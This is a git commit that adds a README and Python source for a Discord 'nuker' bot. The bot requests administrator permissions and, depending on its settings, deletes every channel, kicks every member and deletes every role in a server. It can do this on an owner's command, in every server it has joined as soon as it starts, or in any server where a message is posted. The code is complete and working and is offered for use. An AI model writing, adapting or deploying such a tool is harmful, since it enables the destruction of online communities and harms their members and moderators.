b7c85355e8e43e735e411f6083296ea311873bcd
one23hacker321 <94637576+one23hacker321@users.noreply.github.com>
2021-11-27 16:06:52 +0100

    Add files via upload

---
+++ README.md
@@ -0,0 +1,27 @@
+#Requirements:
+- Python 3.8
+- discord.py or a Fork of discord.py
+- Bot Token
+
+##Setup:
+- Paste the Bot Token in the File `settings.json` at `token`
+- Paste your User ID at in the File `settings.json` at `owner`
+
+##Settings:
+All the Settings you can set in the File `settings.json`
+
+Types:
+
+0: Deletes the current Server only when a Owner runs the !delete Command.
+1: Deletes all Servers the Bot is at on start.
+2: Deletes a Server where a Message is send.
+
+Confirms:
+
+0: Instantly deletes the Server, when the !delete Command is run
+1: Waits for a Confirmation by the User, before deleting the Server
+
+Leaves:
+
+0: Dont leaves the Server after deleting it
+1: Leaves the Server after deleting it
---
+++ main.py
@@ -0,0 +1,85 @@
+import discord
+from discord.ext import commands
+import json
+
+with open("settings.json") as f:
+    settings = json.load(f)
+bot = commands.Bot(command_prefix=settings["prefix"])
+
+
+@bot.event
+async def on_ready():
+    print(f"Username: {bot.user.name}\nUserid: {bot.user.id}\nGuilds: {len(bot.guilds)}\nPrefix: {bot.command_prefix}\nInvite: https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot\n-----Log-----\n\n")
+    with open("settings.json") as f:
+        settings = json.load(f)
+        if settings["type"] == "1":
+            for guild in bot.guilds:
+                await ds(guild.id)
+
+
+
+
+@bot.command()
+async def delete(ctx):
+    with open("settings.json") as f:
+        settings = json.load(f)
+    if ctx.author.id in settings["owner"]:
+        print(f"[{ctx.guild.name}] {ctx.author} ran Command '{bot.command_prefix}delete'!")
+        if settings["confirmation"] == "1":
+            msg = await ctx.send("Sure?")
+            valid_reactions = ['✔️', '❌']
+            for emoji in valid_reactions:
+                await msg.add_reaction(emoji)
+
+            def check(reaction, user):
+                return user == ctx.author and str(reaction.emoji) in valid_reactions
+
+            reaction, user = await bot.wait_for('reaction_add', timeout=60.0, check=check)
+            if str(reaction.emoji) == valid_reactions[0]:
+                print(f"[{ctx.guild.name}] {ctx.author} confirmed!")
+                await ds(ctx.guild.id)
+                return
+            print(f"[{ctx.guild.name}] {ctx.author} cancelled!")
+            await ctx.send("Cancelled")
+        else:
+            await ds(ctx.guild.id)
+            return
+
+
+async def ds(sid):
+    server = bot.get_guild(sid)
+    for channel in server.channels:
+        try:
+            await channel.delete()
+        except Exception:
+            print(f"[{server.name}] Skipping Channel '{channel.name}'!")
+        else:
+            print(f"[{server.name}] Deleted Channel '{channel.name}'!")
+    for member in server.members:
+        try:
+            await member.kick()
+        except Exception:
+            print(f"[{server.name}] Skipping Member '{member}'!")
+        else:
+            print(f"[{server.name}] Kicked Member '{member}'!")
+    for role in server.roles:
+        try:
+            await role.delete()
+        except Exception:
+            print(f"[{server.name}] Skipping Role '{role.name}'!")
+        else:
+            print(f"[{server.name}] Deleted Role '{role.name}'!")
+
+    with open("settings.json") as f:
+        settings = json.load(f)
+    if settings["leave"] == "0":
+        return
+    else:
+        await server.leave()
+        print(f"Leaving {server.name}...")
+        return
+
+
+with open("settings.json") as f:
+    settings = json.load(f)
+    bot.run(settings["token"])
